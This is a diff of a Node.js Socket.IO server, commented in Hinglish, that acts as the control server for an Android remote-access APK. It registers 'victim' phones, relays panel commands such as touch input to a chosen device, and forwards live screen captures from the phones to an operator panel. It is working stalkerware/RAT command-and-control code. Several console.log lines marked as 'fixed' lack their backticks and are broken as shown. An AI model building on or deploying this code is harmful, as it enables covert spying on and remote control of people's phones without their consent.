@@ -24,26 +24,24 @@ app.get("/", (req, res) => {
 let devices = [];
 
 io.on("connection", (socket) => {
+    // ===> YAHAN THEEK KIYA GAYA HAI <===
     console.log([+] Ek naya user connect hua: ${socket.id});
 
-    // ================== APK ke hisaab se BADLAV #1 ==================
     // APK 'victim_connect' bhejta hai, to hum use sunenge.
     socket.on('victim_connect', (data) => {
-        const deviceId = socket.id; // Hum server ke socket.id ko hi device ki ID manenge
+        const deviceId = socket.id;
         const deviceName = data.deviceName || 'Unknown Device';
         const battery = data.battery || '--';
         
-        // Check karo ki device pehle se list mein to nahi hai
         if (!devices.find(d => d.deviceId === deviceId)) {
+            // ===> YAHAN THEEK KIYA GAYA HAI <===
             console.log([+] Device register hua: ${deviceName} (${deviceId}));
             devices.push({ deviceId, deviceName, battery });
         }
         
-        // Sabhi panels ko updated device list bhejo
         io.emit('devices_list', devices);
     });
 
-    // ================== APK ke hisaab se BADLAV #2 ==================
     // Panel se 'panel_command' aata hai, use APK ke command mein badlo.
     socket.on('panel_command', (command) => {
         if (!command.targetId) return;
@@ -51,29 +49,23 @@ io.on("connection", (socket) => {
         const eventType = command.type;
         const eventData = command.data || {};
 
+        // ===> YAHAN THEEK KIYA GAYA HAI <===
         console.log([>] Panel se command aaya: '${eventType}', Bhej rahe hain -> ${command.targetId});
         
-        // Panel se aaye command ko seedhe uss event naam se bhejo jise APK sun raha hai.
-        // Jaise, panel 'touch_command' bhejega, to hum bhi aage 'touch_command' hi bhejenge.
         io.to(command.targetId).emit(eventType, eventData);
     });
     
-    // ================== APK ke hisaab se BADLAV #3 ==================
     // APK 'live_screen' bhejta hai, to hum use sunenge.
     socket.on('live_screen', (data) => {
-        // Panel 'live_screen_update' sunta hai, to data ko aage bhej do.
-        // APK se deviceId nahi aa raha, to hum socket.id use karenge.
         data.deviceId = socket.id;
         io.emit('live_screen_update', data);
     });
 
-    // ================== APK ke hisaab se BADLAV #4 ==================
     // APK 'heartbeat' bhejta hai, to hum use sunenge.
     socket.on('heartbeat', (data) => {
         const device = devices.find(d => d.deviceId === socket.id);
         if (device && data.battery) {
             device.battery = data.battery;
-            // Panel ko 'status_update' aur 'devices_list' bhejo
             io.emit('status_update', { deviceId: socket.id, battery: data.battery });
             io.emit('devices_list', devices);
         }
@@ -81,10 +73,9 @@ io.on("connection", (socket) => {
 
     // Connection tootne par
     socket.on("disconnect", () => {
+        // ===> YAHAN THEEK KIYA GAYA HAI <===
         console.log([-] User disconnect hua: ${socket.id});
-        // Device ko list se hatao
         devices = devices.filter(d => d.deviceId !== socket.id);
-        // Sabhi panels ko updated list bhejo
         io.emit('devices_list', devices);
     });
 });
